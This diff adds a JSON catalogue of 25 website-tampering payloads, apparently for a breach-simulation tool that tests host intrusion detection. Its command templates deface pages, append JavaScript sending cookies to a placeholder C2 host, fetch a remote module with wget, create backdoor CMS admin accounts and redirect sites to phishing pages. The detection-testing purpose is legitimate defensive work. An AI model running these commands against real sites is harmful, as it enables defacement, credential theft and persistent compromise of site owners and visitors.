@@ -1,0 +1,945 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: index.html replace",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "覆盖 index.html 为定制 deface 页面（最经典）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<h1>HACKED by ATTACKER</h1>' > {{WEBROOT}}/index.html",
+    "hids_artifact_path": "{{WEBROOT}}/index.html",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/index.html"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: JS inject in static",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "在已有静态 JS 末尾追加恶意 fetch C2 + 数据外传。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.007"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'fetch(\"http://{{C2_HOST}}/beacon?d=\"+document.cookie);' >> {{WEBROOT}}/app.js",
+    "hids_artifact_path": "{{WEBROOT}}/app.js",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/app.js"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: CSS class swap",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "替换 CSS 隐藏页面元素或加 phishing 浮层。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cat fishing.css >> {{WEBROOT}}/main.css",
+    "hids_artifact_path": "{{WEBROOT}}/main.css",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/main.css"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: .htaccess redirect",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Apache .htaccess 全站 302 跳转到攻击者域名。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'Redirect 302 / https://{{C2_HOST}}/phish' > {{WEBROOT}}/.htaccess",
+    "hids_artifact_path": "{{WEBROOT}}/.htaccess",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/.htaccess"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: robots.txt manipulation",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "robots.txt 公开搜索引擎让蜘蛛抓敏感路径。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'Allow: /admin/\\nAllow: /backup/' > {{WEBROOT}}/robots.txt",
+    "hids_artifact_path": "{{WEBROOT}}/robots.txt",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/robots.txt"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: sitemap injection",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "sitemap.xml 注入恶意 URL 让 Google 抓住后投放。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<url><loc>http://{{C2_HOST}}/free</loc></url>' >> {{WEBROOT}}/sitemap.xml",
+    "hids_artifact_path": "{{WEBROOT}}/sitemap.xml",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/sitemap.xml"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: favicon hijack",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "替换 favicon 为攻击者标识（demo / 心理战）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cp evil.ico {{WEBROOT}}/favicon.ico",
+    "hids_artifact_path": "{{WEBROOT}}/favicon.ico",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/favicon.ico"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: wp header.php",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WordPress 主题 header.php 注入恶意 JS。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "sed -i '/<\\/head>/i <script src=\"http://{{C2_HOST}}/x.js\"></script>' {{WEBROOT}}/wp-content/themes/*/header.php",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:wp_theme_header"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: wp functions.php",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WordPress 主题 functions.php 加 wp_head hook 注入。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'add_action(\"wp_head\",function(){echo \"<script src=http://{{C2_HOST}}/x.js></script>\";});' >> {{WEBROOT}}/wp-content/themes/twentytwentytwo/functions.php",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:wp_theme_functions"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: wp_options siteurl",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "wp_options siteurl 改成攻击者域名做钓鱼。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mysql wp -e \"UPDATE wp_options SET option_value='https://{{C2_HOST}}' WHERE option_name='siteurl'\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "db_modify:wp_options"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: wp admin user create",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WordPress 直接 SQL 创建管理员账户。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1136.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mysql wp -e \"INSERT INTO wp_users (user_login,user_pass) VALUES ('attacker',MD5('Spring!'))\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "db_insert:wp_users"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: joomla configuration",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Joomla 修改 configuration.php sitename 显示 deface。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "sed -i \"s/public \\$sitename = '.*'/public \\$sitename = 'HACKED'/g\" {{WEBROOT}}/configuration.php",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:joomla_config"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: drupal hook_form_alter",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Drupal 模块注入 hook_form_alter 改登录提交目标。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/evil_module.tgz -O - | tar -xz -C {{WEBROOT}}/modules/",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_create:drupal_module"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: magento admin/CMS",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Magento admin/cms_page 改首页 HTML。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "mysql magento -e \"UPDATE cms_page SET content='HACKED' WHERE identifier='home'\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "db_modify:cms_page"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: ghost cms post",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Ghost CMS posts 表覆写文章 mobiledoc。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "psql ghost -c \"UPDATE posts SET html='<h1>OWNED</h1>' WHERE slug='welcome'\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "db_modify:ghost_posts"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: sharepoint web part",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "SharePoint 注入恶意 Web Part 全 site 显示。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "Add-PnPCustomAction -Url http://{{C2_HOST}}/x.js -Title evil -Location ScriptLink",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:powershell"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: shtml SSI",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Apache .shtml SSI 文件嵌入 exec cgi。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<!--#exec cmd=\"id\"-->' > {{WEBROOT}}/x.shtml",
+    "hids_artifact_path": "{{WEBROOT}}/x.shtml",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/x.shtml"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: web.config tamper",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ASP.NET web.config 注入 authorization rules 绕认证。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "type evil.config > C:\\inetpub\\wwwroot\\web.config",
+    "hids_artifact_path": "C:\\inetpub\\wwwroot\\web.config",
+    "hids_expected_artifacts": [
+      "file_modify:web.config"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: IIS appcmd",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "appcmd 添加 IIS 站点重写规则把根 / 重定向到 C2。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "appcmd set config -section:system.webServer/rewrite/rules /+\"[name='evil',patternSyntax='ECMAScript',stopProcessing='True']\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:appcmd.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: mime hijack",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": ".htaccess AddType 让 .png 走 php handler，落 polyglot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'AddType application/x-httpd-php .png' >> {{WEBROOT}}/.htaccess",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:.htaccess"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: nginx config inject",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "nginx server block 增加 return 302 → C2 域名。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'server { listen 80; return 302 https://{{C2_HOST}}; }' >> /etc/nginx/conf.d/redirect.conf;nginx -s reload",
+    "hids_artifact_path": "/etc/nginx/conf.d/redirect.conf",
+    "hids_expected_artifacts": [
+      "file_create:nginx_redirect",
+      "proc:nginx"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: error page tamper",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Apache ErrorDocument 把 404 重定向到 C2。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'ErrorDocument 404 http://{{C2_HOST}}/phish' >> {{WEBROOT}}/.htaccess",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:.htaccess"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: cms admin backdoor",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "CMS DB 加 backdoor 用户 + super-admin 角色。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1136"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "psql cms -c \"INSERT INTO users (username,password,role) VALUES ('bd','$2y$10$x','super')\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "db_insert:users"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: plugin malicious upload",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WordPress 通过 admin 上传 zip 含 evil plugin（rce 实质 + deface 副作用）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "curl -F 'plugin=@evil.zip' http://{{TARGET_HOST}}/wp-admin/update.php?action=upload-plugin",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "http_outbound:{{TARGET_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Website Tampering: html banner inject",
+    "payload_external_id": "HIDS-WEBSITETAMPERING-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "在所有 .html 文件尾部 sed -i 注入 banner。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1491.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "website_tampering"
+    ],
+    "hids_category": "website_tampering",
+    "hids_execution_mode": "command",
+    "hids_command_template": "find {{WEBROOT}} -name '*.html' -exec sed -i 's|</body>|<div>HACKED</div></body>|' {} +",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:html_bulk"
+    ]
+  }
+]
